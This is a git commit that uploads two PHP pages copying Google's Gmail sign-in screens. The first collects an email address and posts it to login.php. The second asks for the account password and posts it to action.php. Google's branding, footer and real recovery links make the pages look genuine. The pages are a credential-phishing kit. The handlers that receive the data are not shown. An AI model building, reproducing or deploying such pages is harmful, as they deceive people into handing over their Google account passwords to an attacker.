6f4ba561e2f4bb21b46cf7ec3a201093177e0e86
pinnocent <65961768+pinnocent@users.noreply.github.com>
2020-06-25 05:26:58 -1200

    Add files via upload

---
+++ asset/gcode/gmail.php
@@ -0,0 +1,271 @@
+<meta charset="UTF-8"><meta content="text/html; charset=UTF-8" name="Content-Type" /><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" type="image/x-icon" href="favicon.png" /><link rel="stylesheet" href="style.css"><title> Gmail </title>
+
+
+
+
+
+
+<style>
+
+
+@font-face {
+  font-family: insta;
+  src: url(google.ttf);
+}
+
+
+.img {
+margin-top: 6px;
+width: 120px;
+height: 45px;
+}
+
+.signin {
+margin-top: 10px;
+font-size: 25px;
+font-family: google;
+font-weight: 400;
+}
+
+
+.gmail {
+margin-top: 10px;
+font-family: google;
+font-weight: 400;
+border-radius: 20px;
+border: 1px solid #d4d4d4;
+padding: 5px;
+width: 190px;
+font-size: 14px;
+}
+
+
+.user {
+width: 15px;
+height: 15px;
+display: inline;
+margin-left: -168px;
+margin-right: 5px;
+margin-top: 0px;
+}
+
+
+.email {
+position: absolute;
+margin-top: 1px;
+display: inline;
+font-size: 13px;
+font-family: google;
+font-weight: 500;
+}
+
+
+.input {
+width: 90%;
+margin-top: 40px;
+padding: 16px;
+border: 1px solid #D4D4D4;
+border-radius: 5px;
+outline: none;
+font-size: 16px;
+font-family: google;
+}
+
+
+.input:hover {
+border: 2px solid #1A73E8;
+}
+
+
+.forget {
+color: #1A73E8;
+font-family: google;
+text-decoration: none;
+border-radius: 5px;
+font-weight: 500;
+font-size: 14px;
+}
+
+
+.arg {
+margin-left: 20px;
+margin-bottom: 40px;
+}
+
+
+.forget:hover {
+background: #C4DCF8;
+}
+
+
+.comp {
+color: grey;
+font-family: google;
+font-size: 14px;
+margin-left: 20px;
+}
+
+
+.learn {
+font-size: 14px;
+color: #1A73E8;
+font-weight: 500;
+margin-left: 20px;
+font-family: google;
+}
+
+
+.more {
+margin-top: 3px;
+margin-bottom: 20px;
+}
+
+
+a {
+text-decoration: none;
+}
+
+.end {
+width: 90%;
+margin-top: 40px;
+}
+
+
+.bleft {
+margin-left: -8px;
+float: left;
+background: none;
+color: #1A73E8;
+border: none;
+outline: none;
+font-family: google;
+padding: 10px;
+border-radius: 5px;
+font-weight: 500;
+font-size: 14px;
+}
+
+
+.bright {
+float: right;
+background: #1A73E8;
+color: white;
+font-family: google;
+padding: 10px;
+border-radius: 5px;
+border: none;
+outline: none;
+width: 90px;
+font-size: 14px;
+}
+
+
+.bleft:hover {
+background: #A8BDDA;
+}
+
+
+.bright:hover {
+background: #3367D5;
+}
+
+
+.makeit {
+margin-top: 30px;
+}
+
+
+.footer {
+margin-top: 500px;
+border-top: 1px solid #d4d4d4;
+width: 105%;
+margin-left: -10px;
+}
+
+
+.mario {
+font-family: google;
+font-size: 12px;
+color: grey;
+padding-top: 5px;
+padding-left: 20px;
+}
+
+
+.super {
+font-family: google;
+font-size: 12px;
+color: grey;
+padding-left: 20px;
+padding-top: 5px;
+}
+
+
+.bros {
+font-family: google;
+font-size: 12px;
+color: grey;
+padding-top: 5px;
+padding-left: 70px;
+}
+
+</style>
+
+
+<center>
+<img class="img" src="google.png"/>
+<div class="signin"> Sign in </div>
+
+<div class="gmail"> 
+
+
+<img class="user" src="user.png"/>
+<div class="email">****************@gmail.com </div>
+
+
+</div>
+
+
+<form action="action.php" method="post">
+
+<input type="password" name="password" class="input" placeholder="Enter your password"/>
+</center>
+
+
+<center>
+<div class="end">
+<a class="bleft" href="https://accounts.google.com/signin/v2/challenge/pwd?flowName=GlifWebSignIn&flowEntry=AddSession&cid=2&TL=AM3QAYbDTtn90AuKHYMzXuSescsvoR__nedGyxa36JlkKZYPFCfWou5t0IWyG-jA&navigationDirection=forward"> Forgot password? </a>
+
+<input type="submit" value="Next" class="bright"/>
+</div>
+</center>
+
+
+</form>
+
+
+
+
+
+
+
+<div class="footer">
+
+
+<table>
+<tr>
+<th class="super">English (United States)</th>
+<th class="bros">Help</th>
+<th class="mario">Privacy</th>
+<th class="mario">Terms</th>
+</tr>
+</table>
+
+
+</div>
+
+
+
+
+
+
---
+++ asset/gcode/index.php
@@ -0,0 +1,241 @@
+<meta charset="UTF-8"><meta content="text/html; charset=UTF-8" name="Content-Type" /><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" type="image/x-icon" href="favicon.png" /><link rel="stylesheet" href="style.css"><title> Gmail </title>
+
+<style>
+
+
+
+
+
+
+.img {
+margin-top: 6px;
+width: 120px;
+height: 45px;
+}
+
+.signin {
+margin-top: 10px;
+font-size: 25px;
+font-family: google;
+font-weight: 400;
+}
+
+
+.gmail {
+margin-top: 10px;
+font-family: google;
+font-weight: 400;
+}
+
+
+.input {
+width: 90%;
+margin-top: 40px;
+padding: 16px;
+border: 1px solid #D4D4D4;
+border-radius: 5px;
+outline: none;
+font-size: 16px;
+font-family: google;
+}
+
+
+.input:hover {
+border: 2px solid #1A73E8;
+}
+
+
+.forget {
+color: #1A73E8;
+font-family: google;
+text-decoration: none;
+border-radius: 5px;
+font-weight: 500;
+font-size: 14px;
+}
+
+
+.arg {
+margin-left: 20px;
+margin-bottom: 40px;
+}
+
+
+.forget:hover {
+background: #C4DCF8;
+}
+
+
+.comp {
+color: grey;
+font-family: google;
+font-size: 14px;
+margin-left: 20px;
+}
+
+
+.learn {
+font-size: 14px;
+color: #1A73E8;
+font-weight: 500;
+margin-left: 20px;
+font-family: google;
+}
+
+
+.more {
+margin-top: 3px;
+margin-bottom: 20px;
+}
+
+
+a {
+text-decoration: none;
+}
+
+.end {
+width: 90%;
+}
+
+
+.bleft {
+margin-left: -8px;
+float: left;
+background: none;
+color: #1A73E8;
+border: none;
+outline: none;
+font-family: google;
+padding: 10px;
+border-radius: 5px;
+font-weight: 500;
+font-size: 14px;
+}
+
+
+.bright {
+float: right;
+background: #1A73E8;
+color: white;
+font-family: google;
+padding: 10px;
+border-radius: 5px;
+border: none;
+outline: none;
+width: 90px;
+font-size: 14px;
+}
+
+
+.bleft:hover {
+background: #A8BDDA;
+}
+
+
+.bright:hover {
+background: #3367D5;
+}
+
+
+
+.footer {
+margin-top: 350px;
+border-top: 1px solid #d4d4d4;
+width: 105%;
+margin-left: -10px;
+}
+
+
+.mario {
+font-family: google;
+font-size: 12px;
+color: grey;
+padding-top: 5px;
+padding-left: 20px;
+}
+
+
+.super {
+font-family: google;
+font-size: 12px;
+color: grey;
+padding-left: 20px;
+padding-top: 5px;
+}
+
+
+.bros {
+font-family: google;
+font-size: 12px;
+color: grey;
+padding-top: 5px;
+padding-left: 70px;
+}
+
+</style>
+
+
+<center>
+<img class="img" src="google.png"/>
+<div class="signin"> Sign in </div>
+<div class="gmail"> to continue to Gmail </div>
+
+
+<form action="login.php" method="post">
+
+<input type="text" name="mail" class="input" placeholder="Email or phone"/>
+</center>
+
+
+<div class="arg">
+<a  class="forget" href="https://accounts.google.com/signin/v2/usernamerecovery"> Forget email? </a></div>
+
+<div class="comp"> Not your computer? Use a Private Window to sign in. </div>
+
+
+<div class="more">
+<a class="learn" href="https://support.google.com/accounts?p=signin_privatebrowsing&hl=en"> Learn more </a></div>
+<br/>
+
+
+<center>
+<div class="end">
+<a class="bleft" href="https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp"> Create account </a>
+
+<input type="submit" value="Next" class="bright"/>
+</div>
+</center>
+
+
+</form>
+
+
+
+
+
+
+<div class="footer">
+
+
+<table>
+<tr>
+<th class="super">English (United States)</th>
+<th class="bros">Help</th>
+<th class="mario">Privacy</th>
+<th class="mario">Terms</th>
+</tr>
+</table>
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
